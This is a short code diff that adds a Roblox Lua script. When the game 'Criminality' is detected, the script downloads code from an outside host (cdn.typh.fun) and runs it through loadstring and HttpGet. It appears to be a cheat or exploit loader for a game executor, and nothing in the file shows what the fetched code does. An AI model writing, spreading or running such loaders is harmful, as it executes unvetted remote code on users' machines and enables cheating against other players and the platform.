@@ -1,0 +1,3 @@
+if game.PlaceId ~= 1087852616 and game.GameId == 1494262959 then
+    loadstring(game:HttpGet("https://cdn.typh.fun/loader?Utility=/Games/Criminality"))();
+end
